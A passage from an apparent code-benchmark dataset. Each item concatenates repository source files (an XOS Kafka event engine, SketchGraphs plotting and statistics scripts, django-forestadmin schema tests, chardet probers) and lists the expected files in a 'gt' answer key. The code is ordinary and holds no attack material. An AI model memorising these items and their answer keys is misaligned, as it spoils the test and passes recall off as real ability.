            self.log.exception(\"Exception in kafka loop: %s\" % e)\n                time.sleep(1)\n                continue\n\n\n            msg = self.consumer.poll(timeout=1.0)\n\n            if msg is None:\n                continue\n\n            if msg.error():\n                if msg.error().code() == confluent_kafka.KafkaError._PARTITION_EOF:\n                    self.log.debug(\n                        \"Reached end of kafka topic %s, partition: %s, offset: %d\"\n                        % (msg.topic(), msg.partition(), msg.offset())\n                    )\n                else:\n                    self.log.exception(\"Error in kafka message: %s\" % msg.error())\n\n            else:\n\n                event_msg = XOSKafkaMessage(msg)\n\n                self.log.info(\n                    \"Processing event\", event_msg=event_msg, step=self.step.__name__\n                )\n\n                try:\n                    self.step(\n                        model_accessor=self.model_accessor, log=self.log\n                    ).process_event(event_msg)\n\n                except BaseException:\n                    self.log.exception(\n                        \"Exception in event step\",\n                        event_msg=event_msg,\n                        step=self.step.__name__,\n                    )\n\n\nclass XOSEventEngine(object):\n\n\n    def __init__(self, model_accessor, log):\n        self.event_steps = []\n        self.threads = []\n        self.model_accessor = model_accessor\n        self.log = log\n\n    def load_event_step_modules(self, event_step_dir):\n        self.event_steps = []\n        self.log.info(\"Loading event steps\", event_step_dir=event_step_dir)\n\n\n        for fn in os.listdir(event_step_dir):\n            pathname = os.path.join(event_step_dir, fn)\n            if (\n                os.path.isfile(pathname)\n                and fn.endswith(\".py\")\n                and (fn != \"__init__.py\")\n                and (\"test\" not in fn)\n            ):\n                event_module = imp.load_source(fn[:-3], pathname)\n\n                for classname in dir(event_module):\n                    c = getattr(event_module, classname, None)\n\n                    if inspect.isclass(c):\n                        base_names = [b.__name__ for b in c.__bases__]\n                        if \"EventStep\" in base_names:\n                            self.event_steps.append(c)\n        self.log.info(\"Loaded event steps\", steps=self.event_steps)\n\n    def start(self):\n        eventbus_kind = Config.get(\"event_bus.kind\")\n        eventbus_endpoint = Config.get(\"event_bus.endpoint\")\n\n        if not eventbus_kind:\n            self.log.error(\n                \"Eventbus kind is not configured in synchronizer config file.\"\n            )\n            return\n\n        if eventbus_kind not in [\"kafka\"]:\n            self.log.error(\n                \"Eventbus kind is set to a technology we do not implement.\",\n                eventbus_kind=eventbus_kind,\n            )\n            return\n\n        if not eventbus_endpoint:\n            self.log.error(\n                \"Eventbus endpoint is not configured in synchronizer config file.\"\n            )\n            return\n\n        for step in self.event_steps:\n            if step.technology == \"kafka\":\n                thread = XOSKafkaThread(\n                    step, [eventbus_endpoint], self.model_accessor, self.log\n                )\n                thread.start()\n                self.threads.append(thread)\n            else:\n                self.log.error(\n                    \"Unknown technology. Skipping step\",\n                    technology=step.technology,\n                    step=step.__name__,\n                )\n\n'xos/lib/xos-synchronizer/xossynchronizer/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom .synchronizer import Synchronizer\n\n__all__ = [\"Synchronizer\"]\n",
        "gt": [
            "'xos/lib/xos-synchronizer/xossynchronizer/event_engine.py'",
            "'xos/lib/xos-synchronizer/xossynchronizer/backend.py'",
            "'xos/lib/xos-synchronizer/xossynchronizer/synchronizer.py'",
            "'xos/lib/xos-synchronizer/xossynchronizer/__init__.py'",
            "'xos/testservice/xos/synchronizer/testservice-synchronizer.py'"
        ]
    },
    {
        "files": [
            "'SketchGraphs/sketchgraphs/data/_plotting.py'",
            "'SketchGraphs/sketchgraphs/data/sketch.py'",
            "'SketchGraphs/sketchgraphs/pipeline/make_quantization_statistics.py'"
        ],
        "content": "'SketchGraphs/sketchgraphs/data/_plotting.py'\n:\n\nimport math\nfrom contextlib import nullcontext\n\nimport matplotlib as mpl\nimport matplotlib.patches\nimport matplotlib.pyplot as plt\n\nfrom ._entity import Arc, Circle, Line, Point\n\n\ndef _get_linestyle(entity):\n    return '--' if entity.isConstruction else '-'\n\ndef sketch_point(ax, point: Point, color='black', show_subnodes=False):\n    ax.scatter(point.x, point.y, c=color, marker='.')\n\ndef sketch_line(ax, line: Line, color='black', show_subnodes=False):\n    start_x, start_y = line.start_point\n    end_x, end_y = line.end_point\n    if show_subnodes:\n        marker = '.'\n    else:\n        marker = None\n    ax.plot((start_x, end_x), (start_y, end_y), color, linestyle=_get_linestyle(line), linewidth=1, marker=marker)\n\ndef sketch_circle(ax, circle: Circle, color='black', show_subnodes=False):\n    patch = matplotlib.patches.Circle(\n        (circle.xCenter, circle.yCenter), circle.radius,\n        fill=False, linestyle=_get_linestyle(circle), color=color)\n    if show_subnodes:\n        ax.scatter(circle.xCenter, circle.yCenter, c=color, marker='.', zorder=20)\n    ax.add_patch(patch)\n\ndef sketch_arc(ax, arc: Arc, color='black', show_subnodes=False):\n    angle = math.atan2(arc.yDir, arc.xDir) * 180 / math.pi\n    startParam = arc.startParam * 180 / math.pi\n    endParam = arc.endParam * 180 / math.pi\n\n    if arc.clockwise:\n        startParam, endParam = -endParam, -startParam\n\n    ax.add_patch(\n        matplotlib.patches.Arc(\n            (arc.xCenter, arc.yCenter), 2*arc.radius, 2*arc.radius,\n            angle=angle, theta1=startParam, theta2=endParam,\n            linestyle=_get_linestyle(arc), color=color))\n\n    if show_subnodes:\n        ax.scatter(arc.xCenter, arc.yCenter, c=color, marker='.')\n        ax.scatter(*arc.start_point, c=color, marker='.', zorder=40)\n        ax.scatter(*arc.end_point, c=color, marker='.', zorder=40)\n\n\n_PLOT_BY_TYPE = {\n    Arc: sketch_arc,\n    Circle: sketch_circle,\n    Line: sketch_line,\n    Point: sketch_point\n}\n\n\ndef render_sketch(sketch, ax=None, show_axes=False, show_origin=False,\n                  hand_drawn=False, show_subnodes=False, show_points=True):\n\n    with plt.xkcd(\n        scale=1, length=100, randomness=3) if hand_drawn else nullcontext():\n\n        if ax is None:\n            fig = plt.figure()\n            ax = fig.add_subplot(111, aspect='equal')\n        else:\n            fig = None\n\n\n        ax.spines['right'].set_color('none')\n        ax.spines['top'].set_color('none')\n\n        if not show_axes:\n            ax.set_yticklabels([])\n            ax.set_xticklabels([])\n            _ = [line.set_marker('None') for line in ax.get_xticklines()]\n            _ = [line.set_marker('None') for line in ax.get_yticklines()]\n\n\n            ax.spines['left'].set_color('none')\n            ax.spines['bottom'].set_color('none')\n\n        if show_origin:\n            point_size = mpl.rcParams['lines.markersize'] * 1\n            ax.scatter(0, 0, s=point_size, c='black')\n\n        for ent in sketch.entities.values():\n            sketch_fn = _PLOT_BY_TYPE.get(type(ent))\n            if isinstance(ent, Point):\n                if not show_points:\n                    continue\n            if sketch_fn is None:\n                continue\n            sketch_fn(ax, ent, show_subnodes=show_subnodes)\n\n\n        ax.relim()\n        ax.autoscale_view()\n\n        return fig\n\n\ndef render_graph(graph, filename, show_node_idxs=False):\n\n    if show_node_idxs:\n        for idx, node in enumerate(graph.nodes()):\n            node.attr['label'] += ' (' + str(idx) + ')'\n    graph.layout('dot')\n    graph.draw(filename)\n\n\n__all__ = ['render_sketch', 'render_graph']\n'SketchGraphs/sketchgraphs/data/sketch.py'\n:\n\nfrom collections import OrderedDict\nfrom typing import Dict\n\n\n\n\nfrom . import _entity\nfrom . import _constraint\nfrom . import _plotting\n\nfrom ._entity import EntityType, SubnodeType, Entity, GenericEntity, Point, Line, Circle, Arc, Spline, Ellipse, ENTITY_TYPE_TO_CLASS\n\nfrom ._constraint import *\nfrom ._plotting import render_sketch, render_graph\n\n\nclass Sketch:\n\n    entities: Dict[str, Entity]\n    constraints: Dict[str, Constraint]\n\n    def __init__(self, entities=None, constraints=None):\n        if entities is None:\n            entities = OrderedDict()\n        if constraints is None:\n            constraints = OrderedDict()\n\n        self.entities = entities\n        self.constraints = constraints\n\n    def to_dict(self) -> dict:\n\n        return {\n            'entities': [e.to_dict() for e in self.entities.values()],\n            'constraints': [c.to_dict() for c in self.constraints.values()]\n        }\n\n    @staticmethod\n    def from_fs_json(sketch_dict, include_external_constraints=True):\n\n        entities = (Entity.from_dict(ed) for ed in sketch_dict['entities'])\n        entities_dict = OrderedDict((e.entityId, e) for e in entities)\n\n        constraints = (Constraint.from_dict(cd) for cd in sketch_dict['constraints'])\n\n        if not include_external_constraints:\n            constraints = (\n                c for c in constraints\n                if not any(isinstance(p, ExternalReferenceParameter) for p in c.parameters))\n\n        constraints_dict = OrderedDict((c.identifier, c) for c in constraints)\n        return Sketch(entities_dict, constraints_dict)\n\n    @staticmethod\n    def from_info(sketch_info):\n\n        subnode_suffixes = ('.start', '.end', '.center')\n        entities = [Entity.from_info(ed) for ed in sketch_info if not ed['id'].endswith(subnode_suffixes)]\n        entities_dict = OrderedDict((e.entityId, e) for e in entities)\n        return Sketch(entities=entities_dict)\n\n    def __repr__(self):\n        return 'Sketch(n_entities={0}, n_constraints={1})'.format(len(self.entities), len(self.constraints))\n\n\n__all__ = [\n    'Sketch', 'EntityType', 'SubnodeType', 'Entity', 'GenericEntity', 'Point', 'Line',\n    'Circle', 'Arc', 'Spline', 'Ellipse', 'ENTITY_TYPE_TO_CLASS'] + _constraint.__all__ + _plotting.__all__\n\n'SketchGraphs/sketchgraphs/pipeline/make_quantization_statistics.py'\n:\n\nimport argparse\nimport collections\nimport functools\nimport gzip\nimport itertools\nimport multiprocessing\nimport pickle\nimport os\n\nimport numpy as np\nimport tqdm\n\nfrom sketchgraphs.data import flat_array\nfrom sketchgraphs.data.sequence import EdgeOp\nfrom sketchgraphs.data.sketch import EntityType, ENTITY_TYPE_TO_CLASS\nfrom . import numerical_parameters\n\n\n_EDGE_PARAMETER_IDS = ('angle', 'length')\n\n\ndef _worker_edges(dataset_path, worker_idx, num_workers, result_queue):\n\n    data = flat_array.load_dictionary_flat(np.load(dataset_path, mmap_mode='r'))\n    sequences = data['sequences']\n\n\n    length_for_worker, num_additional = divmod(len(sequences), num_workers)\n    offset = worker_idx * length_for_worker + max(worker_idx, num_additional)\n    if worker_idx < num_additional:\n        length_for_worker += 1\n\n    seq_indices = range(offset, min((offset+length_for_worker, len(sequences))))\n\n\n    expression_counters = {\n        k: collections.Counter() for k in _EDGE_PARAMETER_IDS\n    }\n\n    num_processed = 0\n\n    for seq_idx in seq_indices:\n        seq = sequences[seq_idx]\n\n        try:\n            for op in seq:\n                if not isinstance(op, EdgeOp):\n                    continue\n\n                for k in _EDGE_PARAMETER_IDS:\n                    if k in op.parameters:\n                        value = op.parameters[k]\n                        value = numerical_parameters.normalize_expression(value, k)\n                        expression_counters[k][value] += 1\n        except Exception:\n            print('Error processing sequence at index {0}'.format(seq_idx))\n\n        num_processed += 1\n        if num_processed > 1000:\n            result_queue.put(num_processed)\n            num_processed = 0\n    result_queue.put(num_processed)\n\n    result_queue.put(expression_counters)\n\n\ndef _worker_node(param_combination, filepath, num_centers, max_values=None):\n    label, param_name = param_combination\n    sequences = flat_array.load_dictionary_flat(np.load(filepath, mmap_mode='r'))['sequences']\n\n    values = (op.parameters[param_name] for op in itertools.chain.from_iterable(sequences)\n              if op.label == label and param_name in op.parameters)\n\n    if max_values is not None:\n        values = itertools.islice(values, max_values)\n\n    values = np.array(list(values))\n    centers = numerical_parameters.make_quantization(values, num_centers, 'cdf')\n    return centers\n\n\ndef process_edges(dataset_path, num_threads):\n    print('Checking total sketch dataset size.')\n    total_sequences = len(flat_array.load_dictionary_flat(np.load(dataset_path, mmap_mode='r'))['sequences'])\n\n    result_queue = multiprocessing.Queue()\n\n    workers = []\n\n    for worker_idx in range(num_threads):\n        workers.append(\n            multiprocessing.Process(\n                target=_worker_edges,\n                args=(dataset_path, worker_idx, num_threads, result_queue)))\n\n    for worker in workers:\n        worker.start()\n\n    active_workers = len(workers)\n\n    total_result = {}\n\n    print('Processing sequences for edge statistics')\n    with tqdm.tqdm(total=total_sequences) as pbar:\n        while active_workers > 0:\n            result = result_queue.get()\n\n            if isinstance(result, int):\n                pbar.update(result)\n                continue\n\n            for k, v  in result.items():\n                total_result.setdefault(k, collections.Counter()).update(v)\n            active_workers -= 1\n\n    for worker in workers:\n        worker.join()\n\n    return total_result\n\n\ndef process_nodes(dataset_path, num_centers, num_threads):\n    print('Processing sequences for node statistics')\n    label_parameter_combinations = [\n        (t, parameter_name)\n        for t in (EntityType.Arc, EntityType.Circle, EntityType.Line, EntityType.Point)\n        for parameter_name in ENTITY_TYPE_TO_CLASS[t].float_ids\n    ]\n\n    pool = multiprocessing.Pool(num_threads)\n\n    all_centers = pool.map(\n        functools.partial(\n            _worker_node, filepath=dataset_path, num_centers=num_centers, max_values=50000),\n        label_parameter_combinations)\n\n    result = {}\n    for (t, parameter_name), centers in zip(label_parameter_combinations, all_centers):\n        result.setdefault(t, {})[parameter_name] = centers\n\n    return result\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--input', type=str, help='Input sequence dataset', required=True)\n    parser.add_argument('--output', type=str, help='Output dataset path', default='meta.pkl.gz')\n    parser.add_argument('--num_threads', type=int, default=0)\n    parser.add_argument('--node_num_centers', type=int, default=256)\n\n    args = parser.parse_args()\n\n    num_threads = args.num_threads\n    if num_threads is None:\n        num_threads = len(os.sched_getaffinity(0))\n\n    edge_results = process_edges(args.input, num_threads)\n    node_results = process_nodes(args.input, args.node_num_centers, num_threads)\n\n    print('Saving results in {0}'.format(args.output))\n    with gzip.open(args.output, 'wb', compresslevel=9) as f:\n        pickle.dump({\n            'edge': edge_results,\n            'node': node_results\n        }, f, protocol=pickle.HIGHEST_PROTOCOL)\n\n\nif __name__ == '__main__':\n    main()\n",
        "gt": [
            "'SketchGraphs/sketchgraphs/data/_plotting.py'",
            "'SketchGraphs/sketchgraphs/data/sketch.py'",
            "'SketchGraphs/sketchgraphs/pipeline/make_quantization_statistics.py'"
        ]
    },
    {
        "files": [
            "'django-forestadmin/django_forest/tests/forest/__init__.py'",
            "'django-forestadmin/django_forest/tests/forest/place.py'",
            "'django-forestadmin/django_forest/tests/utils/test_schema.py'"
        ],
        "content": "'django-forestadmin/django_forest/tests/forest/__init__.py'\n:from django_forest.tests.forest.choice import ChoiceForest\nfrom django_forest.tests.forest.question import QuestionForest\nfrom django_forest.tests.forest.place import PlaceForest\n\n__all__ = ['QuestionForest', 'ChoiceForest', 'PlaceForest']\n\n'django-forestadmin/django_forest/tests/forest/place.py'\n:from django_forest.tests.models import Place\nfrom django_forest.utils.collection import Collection\n\nfrom django_forest.resources.utils.resource import ResourceView\nfrom django_forest.resources.views import ListView, DetailView\n\nclass PlaceForest(Collection):\n    def load(self):\n        self.fields = [\n            {\n                'field': 'restaurant',\n                \"reference\": \"tests_restaurant.id\",\n                'type': 'String',\n                \"filter\": self.filter_restaurant,\n                \"is_filterable\": True,\n\n            }\n        ]\n\n    def filter_restaurant(self, obj):\n        if obj.restaurant:\n            return obj.restaurant\n        return None\n\nCollection.register(PlaceForest, Place)\n\n'django-forestadmin/django_forest/tests/utils/test_schema.py'\n:import copy\nimport json\nimport os\nimport sys\n\nimport django\nimport pytest\nfrom unittest import mock\nfrom django.test import TestCase, override_settings\n\nfrom django_forest.tests.fixtures.schema import test_schema, test_choice_schema, \\\n    test_exclude_django_contrib_schema, test_serialized_schema, test_question_schema_data\nfrom django_forest.tests.utils.test_forest_api_requester import mocked_requests, mocked_requests_no_data\nfrom django_forest.utils.collection import Collection\nfrom django_forest.utils.schema.json_api_schema import JsonApiSchema\nfrom django_forest.utils.models import Models\nfrom django_forest.utils.schema import Schema\nfrom django_forest.utils.scope import ScopeManager\n\n\n@pytest.fixture()\ndef reset_config_dir_import():\n    for key in list(sys.modules.keys()):\n        if key.startswith('django_forest.tests.forest'):\n            del sys.modules[key]\n\n\n@pytest.mark.skipif(sys.version_info < (3, 8), reason=\"requires python3.8 or higher\")\nclass UtilsSchemaTests(TestCase):\n\n    def setUp(self):\n        Schema.schema = copy.deepcopy(test_schema)\n\n    def tearDown(self):\n\n        Collection._registry = {}\n        JsonApiSchema._registry = {}\n        ScopeManager.cache = {}\n        Schema.schema_data = None\n        Models.models = None\n\n    @mock.patch.object(django, 'get_version', return_value='9.9.9')\n    @mock.patch('importlib.metadata.version', return_value='0.0.0')\n    def test_build_schema(self, mock_version, mock_orm_version):\n\n        Schema.schema = {\n            'collections': [],\n            'meta': {\n                'liana': 'django-forestadmin',\n                'liana_version': '0.0.0',\n                'stack': {\n                    'database_type': 'sqlite',\n                    'orm_version': '9.9.9'\n                },\n            }\n        }\n        Schema.models = Models.list()\n        schema = Schema.build_schema()\n        self.assertEqual(schema, test_schema)\n\n    @override_settings(FOREST={'INCLUDED_MODELS': ['tests_choice']})\n    @mock.patch.object(django, 'get_version', return_value='9.9.9')\n    @mock.patch('importlib.metadata.version', return_value='0.0.0')\n    def test_build_schema_included_models(self, mock_version, mock_orm_version):\n\n        Schema.schema = {\n            'collections': [],\n            'meta': {\n                'liana': 'django-forestadmin',\n                'liana_version': '0.0.0',\n                'stack': {\n                    'database_type': 'sqlite',\n                    'orm_version': '9.9.9'\n                },\n            }\n        }\n        Schema.models = Models.list(force=True)\n        schema = Schema.build_schema()\n        self.assertEqual(schema, test_choice_schema)\n\n    @override_settings(FOREST={'EXCLUDED_MODELS': ['tests_permission', 'tests_group', 'tests_user', 'tests_contentType']})\n    @mock.patch.object(django, 'get_version', return_value='9.9.9')\n    @mock.patch('importlib.metadata.version', return_value='0.0.0')\n    def test_build_schema_excluded_models(self, mock_version, mock_orm_version):\n\n        self.maxDiff = None\n        Schema.schema = {\n            'collections': [],\n            'meta': {\n                'liana': 'django-forestadmin',\n                'liana_version': '0.0.0',\n                'stack': {\n                    'database_type': 'sqlite',\n                    'orm_version': '9.9.9'\n                },\n            }\n        }\n        Schema.models = Models.list(force=True)\n        schema = Schema.build_schema()\n        self.assertEqual(schema, test_exclude_django_contrib_schema)\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @mock.patch('django_forest.utils.collection.Collection')\n    def test_add_smart_features(self, collection_mock):\n        Schema.add_smart_features()\n        from django_forest.tests.forest import QuestionForest\n        from django_forest.tests.models import Question\n        collection_mock.register.assert_any_call(QuestionForest, Question)\n\n    def test_get_collection(self):\n        collection = Schema.get_collection('tests_question')\n        self.assertEqual(collection, [x for x in test_schema['collections'] if x['name'] == 'tests_question'][0])\n\n    def test_get_collection_inexist(self):\n        collection = Schema.get_collection('Foo')\n        self.assertEqual(collection, None)\n\n    def test_handle_json_api_schema(self):\n        Schema.handle_json_api_schema()\n        self.assertEqual(len(JsonApiSchema._registry), 22)\n\n\n\n@pytest.fixture()\ndef reset_config_dir_import():\n    for key in list(sys.modules.keys()):\n        if key.startswith('django_forest.tests.forest'):\n            del sys.modules[key]\n\n\nfile_path = os.path.join(os.getcwd(), '.forestadmin-schema.json')\n\n\n@pytest.fixture()\ndef dumb_forestadmin_schema():\n    schema_data = json.dumps(test_schema, indent=2)\n    with open(file_path, 'w') as f:\n        f.write(schema_data)\n\n\n@pytest.fixture()\ndef invalid_forestadmin_schema():\n    schema_data = 'invalid'\n    with open(file_path, 'w') as f:\n        f.write(schema_data)\n\n\nclass UtilsSchemaFileTests(TestCase):\n    def setUp(self):\n        Schema.build_schema()\n        Schema.add_smart_features()\n\n    def tearDown(self):\n\n        Collection._registry = {}\n        JsonApiSchema._registry = {}\n        ScopeManager.cache = {}\n        Schema.schema_data = None\n        Models.models = None\n        if os.path.exists(file_path):\n            os.remove(file_path)\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    def test_handle_schema_file_no_file(self):\n        with self.assertLogs() as cm:\n            self.assertRaises(Exception, Schema.handle_schema_file())\n            self.assertIsNone(Schema.schema_data)\n            self.assertEqual(cm.output, [\n                'ERROR:django_forest.utils.schema:The .forestadmin-schema.json file does not exist.',\n                'ERROR:django_forest.utils.schema:The schema cannot be synchronized with Forest Admin servers.'\n            ])\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @pytest.mark.usefixtures('dumb_forestadmin_schema')\n    def test_handle_schema_file_production(self):\n        Schema.handle_schema_file()\n        self.assertIsNotNone(Schema.schema_data)\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @pytest.mark.usefixtures('invalid_forestadmin_schema')\n    def test_handle_schema_file_invalid_json_production(self):\n        with self.assertLogs() as cm:\n            self.assertRaises(Exception, Schema.handle_schema_file())\n            self.assertIsNone(Schema.schema_data)\n            self.assertEqual(cm.output, [\n                'ERROR:django_forest.utils.schema:The content of .forestadmin-schema.json file is not a correct JSON.',\n                'ERROR:django_forest.utils.schema:The schema cannot be synchronized with Forest Admin servers.'\n            ])\n\n    @pytest.mark.usefixtures('reset_config_dir_import')\n    @override_settings(DEBUG=True)\n    def test_handle_schema_file_debug(self):\n        Schema.handle_schema_file()\n        with open(file_path, 'r') as f:\n            data = f.read()\n            data = json.loads(data)\n            question = [c for c in data['collections'] if c['name'] == 'tests_question'][0]\n            self.assertEqual(len(question['fields']), 7)\n            foo_field = [f for f in question['fields'] if f['field'] == 'foo'][0]\n            self.assertFalse('get' in foo_field)\n            self.assertIsNotNone(Schema.schema_data)\n\n\nclass UtilsSchemaSendTests(TestCase):\n\n    def test_get_serialized_schema(self):\n        Schema.schema_data = test_question_schema_data\n        serialized_schema = Schema.get_serialized_schema()\n        self.assertEqual(serialized_schema, test_serialized_schema)\n\n    @override_settings(FOREST={'FOREST_DISABLE_AUTO_SCHEMA_APPLY': True})\n    @mock.patch.object(Schema, 'get_serialized_schema')\n    def test_send_apimap_disable_apply(self, mocked_get_serialized_schema):\n        Schema.send_apimap()\n        mocked_get_serialized_schema.assert_not_called()\n\n    @override_settings(FOREST={'FOREST_DISABLE_AUTO_SCHEMA_APPLY': 'foo'})\n    def test_send_apimap_server_error(self):\n        self.assertRaises(Exception, Schema.send_apimap())\n\n    @override_settings(DEBUG=True)\n    @mock.patch('requests.post', return_value=mocked_requests({'key1': 'value1'}, 200))\n    def test_send_apimap(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        Schema.send_apimap()\n        mocked_requests_post.assert_called_once_with(\n            'https://api.test.forestadmin.com/forest/apimaps',\n            data=json.dumps(test_serialized_schema),\n            headers={'Content-Type': 'application/json', 'forest-secret-key': 'foo'},\n            params={},\n            verify=False\n        )\n\n    @override_settings(DEBUG=True)\n    @mock.patch('requests.post', return_value=mocked_requests_no_data(204))\n    def test_send_apimap_no_changes(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        Schema.send_apimap()\n        mocked_requests_post.assert_called_once_with(\n            'https://api.test.forestadmin.com/forest/apimaps',\n            data=json.dumps(test_serialized_schema),\n            headers={'Content-Type': 'application/json', 'forest-secret-key': 'foo'},\n            params={},\n            verify=False\n        )\n\n    @mock.patch('requests.post', return_value=mocked_requests({'key1': 'value1'}, 200))\n    def test_send_apimap_production(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        Schema.send_apimap()\n        mocked_requests_post.assert_called_once_with(\n            'https://api.test.forestadmin.com/forest/apimaps',\n            data=json.dumps(test_serialized_schema),\n            headers={'Content-Type': 'application/json', 'forest-secret-key': 'foo'},\n            params={},\n        )\n\n    @mock.patch('requests.post', return_value=mocked_requests({'warning': 'foo'}, 200))\n    def test_send_apimap_warning(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message, 'foo')\n            self.assertEqual(cm.records[0].levelname, 'WARNING')\n\n    @mock.patch('requests.post', side_effect=Exception('foo'))\n    def test_send_apimap_zero(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            self.assertRaises(Exception, Schema.send_apimap())\n            self.assertEqual(cm.records[0].message,\n                             'Cannot send the apimap to Forest. Are you online?')\n            self.assertEqual(cm.records[0].levelname, 'WARNING')\n\n    @mock.patch('requests.post', return_value=mocked_requests({}, 404))\n    def test_send_apimap_not_found(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message,\n                             'Cannot find the project related to the envSecret you configured. Can you check on Forest that you copied it properly in the Forest settings?')\n            self.assertEqual(cm.records[0].levelname, 'ERROR')\n\n    @mock.patch('requests.post', return_value=mocked_requests({}, 503))\n    def test_send_apimap_unavailable(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message,\n                             'Forest is in maintenance for a few minutes. We are upgrading your experience in the forest. We just need a few more minutes to get it right.')\n            self.assertEqual(cm.records[0].levelname, 'WARNING')\n\n    @mock.patch('requests.post', return_value=mocked_requests({}, 500))\n    def test_send_apimap_error(self, mocked_requests_post):\n        Schema.schema_data = test_question_schema_data\n\n        with self.assertLogs() as cm:\n            Schema.send_apimap()\n            self.assertEqual(cm.records[0].message,\n                             'An error occured with the apimap sent to Forest. Please contact support@forestadmin.com for further investigations.')\n            self.assertEqual(cm.records[0].levelname, 'ERROR')\n\n\nclass UtilsSchemaInitTests(TestCase):\n    def test_schema_meta(self):\n        self.assertTrue('liana' in Schema.schema['meta'])\n        self.assertTrue('liana_version' in Schema.schema['meta'])\n        self.assertTrue('stack' in Schema.schema['meta'])\n        self.assertTrue('database_type' in Schema.schema['meta']['stack'])\n        self.assertTrue('orm_version' in Schema.schema['meta']['stack'])\n\n\n@pytest.mark.skipif(sys.version_info < (3, 8), reason=\"requires python3.8 or higher\")\nclass UtilsGetAppVersionTests(TestCase):\n    @mock.patch('importlib.metadata.version', return_value='0.0.1')\n    def test_get_app_version(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.1')\n\n    @mock.patch('importlib.metadata.version', side_effect=Exception('error'))\n    def test_get_app_version_error(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.0')\n\n\n@pytest.mark.skipif(sys.version_info >= (3, 8), reason=\"requires python3.7 or lower\")\nclass UtilsGetAppOldPythonTests(TestCase):\n\n    @mock.patch('importlib_metadata.version', return_value='0.0.1')\n    def test_get_app_version(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.1')\n\n    @mock.patch('importlib_metadata.version', side_effect=Exception('error'))\n    def test_get_app_version_error(self, mock_version):\n        from django_forest.utils.schema.version import get_app_version\n        version = get_app_version()\n        self.assertEqual(version, '0.0.0')\n",
        "gt": [
            "'django-forestadmin/django_forest/tests/forest/place.py'",
            "'django-forestadmin/django_forest/tests/forest/__init__.py'",
            "'django-forestadmin/django_forest/tests/utils/test_schema.py'"
        ]
    },
    {
        "files": [
            "'TimeSync/GAE/lib/requests/packages/chardet/chardetect.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/hebrewprober.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/constants.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/universaldetector.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/sbcsgroupprober.py'"
        ],
        "content": "'TimeSync/GAE/lib/requests/packages/chardet/chardetect.py'\n:\n\nfrom io import open\nfrom sys import argv, stdin\n\nfrom chardet.universaldetector import UniversalDetector\n\n\ndef description_of(file, name='stdin'):\n\n    u = UniversalDetector()\n    for line in file:\n        u.feed(line)\n    u.close()\n    result = u.result\n    if result['encoding']:\n        return '%s: %s with confidence %s' % (name,\n                                              result['encoding'],\n                                              result['confidence'])\n    else:\n        return '%s: no result' % name\n\n\ndef main():\n    if len(argv) <= 1:\n        print(description_of(stdin))\n    else:\n        for path in argv[1:]:\n            with open(path, 'rb') as f:\n                print(description_of(f, path))\n\n\nif __name__ == '__main__':\n    main()\n\n'TimeSync/GAE/lib/requests/packages/chardet/hebrewprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom .charsetprober import CharSetProber\nfrom .constants import eNotMe, eDetecting\nfrom .compat import wrap_ord\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFINAL_KAF = 0xea\nNORMAL_KAF = 0xeb\nFINAL_MEM = 0xed\nNORMAL_MEM = 0xee\nFINAL_NUN = 0xef\nNORMAL_NUN = 0xf0\nFINAL_PE = 0xf3\nNORMAL_PE = 0xf4\nFINAL_TSADI = 0xf5\nNORMAL_TSADI = 0xf6\n\n\n\n\nMIN_FINAL_CHAR_DISTANCE = 5\n\n\n\n\nMIN_MODEL_DISTANCE = 0.01\n\nVISUAL_HEBREW_NAME = \"ISO-8859-8\"\nLOGICAL_HEBREW_NAME = \"windows-1255\"\n\n\nclass HebrewProber(CharSetProber):\n    def __init__(self):\n        CharSetProber.__init__(self)\n        self._mLogicalProber = None\n        self._mVisualProber = None\n        self.reset()\n\n    def reset(self):\n        self._mFinalCharLogicalScore = 0\n        self._mFinalCharVisualScore = 0\n\n\n\n        self._mPrev = ' '\n        self._mBeforePrev = ' '\n\n\n    def set_model_probers(self, logicalProber, visualProber):\n        self._mLogicalProber = logicalProber\n        self._mVisualProber = visualProber\n\n    def is_final(self, c):\n        return wrap_ord(c) in [FINAL_KAF, FINAL_MEM, FINAL_NUN, FINAL_PE,\n                               FINAL_TSADI]\n\n    def is_non_final(self, c):\n\n\n\n\n\n\n\n\n\n\n        return wrap_ord(c) in [NORMAL_KAF, NORMAL_MEM, NORMAL_NUN, NORMAL_PE]\n\n    def feed(self, aBuf):\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n        if 